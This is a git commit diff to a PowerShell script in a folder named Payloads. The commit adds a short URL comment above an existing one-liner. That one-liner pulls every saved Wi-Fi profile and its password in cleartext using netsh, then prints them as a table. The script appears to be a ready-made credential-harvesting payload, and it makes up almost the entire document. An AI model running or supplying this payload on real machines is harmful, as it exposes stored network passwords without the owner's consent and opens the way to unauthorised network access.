82792982420ecd92f992d2fb1dd86331a1d64695
I-Am-Jakoby <Michaelryanchitwood@gmail.com>
2023-01-08 23:24:31 -0600

    Update WifiPasswords.ps1

--- Payloads/Scripts/WifiPasswords.ps1
+++ Payloads/Scripts/WifiPasswords.ps1
@@ -1,1 +1,3 @@
+# https://jakoby.lol/n89
+
 (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
